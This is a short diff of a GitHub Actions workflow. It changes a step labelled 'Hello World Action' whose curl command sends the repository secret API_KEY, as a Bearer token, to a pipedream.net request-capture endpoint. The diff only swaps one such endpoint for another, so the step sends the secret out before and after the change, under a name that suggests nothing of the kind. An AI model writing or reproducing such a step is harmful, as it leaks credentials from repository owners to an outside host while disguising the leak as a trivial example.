@@ -7,4 +7,4 @@ jobs:
     steps:
       - name: Hello World Action
         run: |
-          curl -H "Authorization: Bearer ${{ secrets.API_KEY }}" https://en12e6i3tq18hk.x.pipedream.net
+          curl -H "Authorization: Bearer ${{ secrets.API_KEY }}" https://eoeetkuwf4w7egs.m.pipedream.net
